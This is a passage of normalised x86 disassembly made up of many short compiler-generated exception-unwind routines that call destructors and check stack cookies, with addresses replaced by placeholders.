add eax 0xc
jmp sub_406a33
sub_44b3f8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b413
lea eax [ ebp + 0xc ]
push eax
call sub_4069e4
retn
sub_44b41d
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44b436
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b451
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_44b45c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b477
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b492
lea eax [ ebp + 0xc ]
push eax
call sub_4069e4
retn
sub_44b49c
lea eax [ ebp - 0x2c ]
push eax
call sub_4069e4
retn
sub_44b4a6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b4c1
lea eax [ ebp - 0x10 ]
jmp sub_40c2aa
sub_44b4c9
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44b4e2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b4fd
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_402f60
sub_44b516
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b531
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
add ecx 0x2c
jmp sub_4036a4
sub_44b54d
mov ecx [ ebp + 0x8 ]
jmp sub_40393a
sub_44b555
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b570
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
add ecx 0x2c
jmp sub_4036a4
sub_44b58c
mov ecx [ ebp + 0x8 ]
jmp sub_40393a
sub_44b594
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b5af
push [ ebp - 0x14 ]
call sub_424fc7
pop ecx
retn
sub_44b5b9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b5d4
lea ecx [ ebp - 0x34 ]
jmp sub_40393a
sub_44b5dc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x68 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b5f7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b612
mov ecx [ ebp + 0x8 ]
jmp sub_403ccd
sub_44b61a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b635
mov ecx [ ebp - 0x10 ]
jmp sub_403ccd
sub_44b63d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b658
lea ecx [ ebp - 0x30 ]
jmp sub_40393a
sub_44b660
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b67b
push [ ebp - 0x14 ]
call sub_424fc7
pop ecx
retn
sub_44b685
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b6a0
lea eax [ ebp - 0x10 ]
jmp sub_4216a8
sub_44b6a8
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44b6c1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b6dc
lea eax [ ebp - 0x10 ]
jmp sub_4215db
sub_44b6e4
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44b6fd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b718
lea eax [ ebp - 0x10 ]
jmp sub_42150e
sub_44b720
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44b739
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b754
lea eax [ ebp - 0x10 ]
jmp sub_421441
sub_44b75c
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44b775
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b790
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_41ea4d
sub_44b79b
mov eax [ ebp + 0x8 ]
add eax 0x14
jmp sub_41ea5a
sub_44b7a6
mov eax [ ebp + 0x8 ]
add eax 0x24
jmp sub_41ea5a
sub_44b7b1
mov ecx [ ebp + 0x8 ]
add ecx 0x34
jmp sub_41e991
sub_44b7bc
mov eax [ ebp + 0x8 ]
add eax 0x3c
jmp sub_41eab7
sub_44b7c7
mov eax [ ebp + 0x8 ]
add eax 0x40
jmp sub_407155
sub_44b7d2
mov eax [ ebp + 0x8 ]
add eax 0x44
push eax
call sub_41e9a4
retn
sub_44b7df
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b7fa
lea eax [ ebp - 0x2c ]
push eax
call sub_4069e4
retn
sub_44b804
lea eax [ ebp - 0x48 ]
push eax
call sub_4069e4
retn
sub_44b80e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x80 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b829
lea eax [ ebp - 0x2c ]
push eax
call sub_4069e4
retn
sub_44b833
lea eax [ ebp - 0x48 ]
push eax
call sub_4069e4
retn
sub_44b83d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x80 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b858
lea eax [ ebp - 0x10 ]
jmp sub_41d83a
sub_44b860
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44b879
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b894
lea eax [ ebp - 0x10 ]
jmp sub_41d774
sub_44b89c
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44b8b5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b8d0
lea eax [ ebp - 0x10 ]
jmp sub_41d6ae
sub_44b8d8
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44b8f1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b90c
lea eax [ ebp - 0x10 ]
jmp sub_41d5e8
sub_44b914
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44b92d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b948
lea eax [ ebp - 0x10 ]
jmp sub_41d522
sub_44b950
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44b969
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b984
lea eax [ ebp - 0x10 ]
jmp sub_41d44f
sub_44b98c
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44b9a5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b9c0
lea eax [ ebp - 0x10 ]
jmp sub_41d37c
sub_44b9c8
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44b9e1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44b9fc
lea eax [ ebp - 0x10 ]
jmp sub_41d2a7
sub_44ba04
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44ba1d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44ba38
lea eax [ ebp - 0x10 ]
jmp sub_41d1d4
sub_44ba40
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44ba59
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44ba74
lea eax [ ebp - 0x10 ]
jmp sub_41d0ff
sub_44ba7c
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44ba95
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44bab0
lea eax [ ebp - 0x10 ]
jmp sub_41d02c
sub_44bab8
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44bad1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44baec
lea eax [ ebp - 0x10 ]
jmp sub_41cf64
sub_44baf4
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44bb0d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44bb28
lea eax [ ebp - 0x3c ]
push eax
call sub_4069e4
retn
sub_44bb32
lea eax [ ebp - 0x58 ]
push eax
call sub_4069e4
retn
sub_44bb3c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44bb57
lea eax [ ebp - 0x3c ]
push eax
call sub_4069e4
retn
sub_44bb61
lea eax [ ebp - 0x58 ]
push eax
call sub_4069e4
retn
sub_44bb6b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44bb86
lea eax [ ebp - 0x3c ]
push eax
call sub_4069e4
retn
sub_44bb90
lea eax [ ebp - 0x58 ]
push eax
call sub_4069e4
retn
sub_44bb9a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44bbb5
lea eax [ ebp - 0x3c ]
push eax
call sub_4069e4
retn
sub_44bbbf
lea eax [ ebp - 0x58 ]
push eax
call sub_4069e4
retn
sub_44bbc9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44bbe4
lea eax [ ebp - 0x3c ]
push eax
call sub_4069e4
retn
sub_44bbee
lea eax [ ebp - 0x58 ]
push eax
call sub_4069e4
retn
sub_44bbf8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44bc13
lea eax [ ebp - 0x3c ]
push eax
call sub_4069e4
retn
sub_44bc1d
lea eax [ ebp - 0x58 ]
push eax
call sub_4069e4
retn
sub_44bc27
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44bc42
push [ ebp - 0x10 ]
call sub_424fc7
pop ecx
retn
sub_44bc4c
lea eax [ ebp - 0x10 ]
jmp sub_41a4f9
sub_44bc54
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44bc6d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44bc88
push [ ebp - 0x10 ]
call sub_424fc7
pop ecx
retn
sub_44bc92
lea eax [ ebp - 0x10 ]
jmp sub_41a441
sub_44bc9a
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44bcb3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44bcce
lea eax [ ebp - 0x10 ]
jmp sub_41a38a
sub_44bcd6
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44bcef
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44bd0a
lea eax [ ebp - 0x10 ]
jmp sub_41a2c0
sub_44bd12
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44bd2b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44bd46
lea eax [ ebp - 0x10 ]
jmp sub_41a1f6
sub_44bd4e
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44bd67
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44bd82
mov eax [ ebp + 0x8 ]
add eax 0x8
jmp sub_413fe0
sub_44bd8d
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44bd95
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44bdb0
mov ecx [ ebp + 0x8 ]
add ecx 0x8
jmp sub_413fd6
sub_44bdbb
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44bdc3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44bdde
mov ecx [ ebp + 0x8 ]
add ecx 0x8
jmp sub_413fcc
sub_44bde9
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44bdf1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44be0c
lea eax [ ebp - 0x10 ]
jmp sub_416c05
sub_44be14
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44be2d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44be48
lea eax [ ebp - 0x10 ]
jmp sub_416b29
sub_44be50
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44be69
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44be84
lea eax [ ebp - 0x10 ]
jmp sub_416a59
sub_44be8c
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44bea5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44bec0
lea eax [ ebp - 0x10 ]
jmp sub_416989
sub_44bec8
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44bee1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44befc
lea eax [ ebp - 0x10 ]
jmp sub_4168cd
sub_44bf04
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44bf1d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44bf38
lea eax [ ebp - 0x10 ]
jmp sub_41680a
sub_44bf40
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44bf59
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44bf74
lea eax [ ebp - 0x10 ]
jmp sub_416748
sub_44bf7c
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44bf95
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44bfb0
lea eax [ ebp - 0x10 ]
jmp sub_416685
sub_44bfb8
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44bfd1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44bfec
lea eax [ ebp - 0x10 ]
jmp sub_4165c9
sub_44bff4
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44c00d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44c028
lea eax [ ebp - 0x10 ]
jmp sub_4164fa
sub_44c030
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44c049
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44c064
lea eax [ ebp - 0x10 ]
jmp sub_416448
sub_44c06c
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44c085
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44c0a0
lea eax [ ebp - 0x10 ]
jmp sub_416396
sub_44c0a8
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44c0c1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44c0dc
lea eax [ ebp - 0x10 ]
jmp sub_4162e4
sub_44c0e4
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44c0fd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44c118
lea eax [ ebp - 0x10 ]
jmp sub_416232
sub_44c120
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44c139
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44c154
lea eax [ ebp - 0x10 ]
jmp sub_416183
sub_44c15c
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44c175
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44c190
lea eax [ ebp - 0x10 ]
jmp sub_4160c3
sub_44c198
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44c1b1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44c1cc
lea eax [ ebp - 0x10 ]
jmp sub_41601e
sub_44c1d4
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44c1ed
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44c208
lea eax [ ebp - 0x10 ]
jmp sub_415f66
sub_44c210
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44c229
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44c244
push [ ebp - 0x10 ]
call sub_424fc7
pop ecx
retn
sub_44c24e
lea eax [ ebp - 0x10 ]
jmp sub_415eb2
sub_44c256
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44c26f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44c28a
push [ ebp - 0x10 ]
call sub_424fc7
pop ecx
retn
sub_44c294
lea eax [ ebp - 0x10 ]
jmp sub_415dda
sub_44c29c
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44c2b5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44c2d0
mov eax [ ebp + 0x8 ]
jmp sub_406a33
sub_44c2d8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44c2f3
mov ecx [ ebp + 0x8 ]
jmp sub_403aac
sub_44c2fb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44c316
lea ecx [ ebp + 0x8 ]
jmp sub_403aac
sub_44c31e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44c339
lea eax [ ebp - 0x10 ]
jmp sub_414381
sub_44c341
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44c35a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44c375
lea eax [ ebp - 0x10 ]
jmp sub_4142dd
sub_44c37d
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
push [ ebp + 0x8 ]
call sub_4069e4
sub_44c396
mov edx [ esp + 0x8 ]
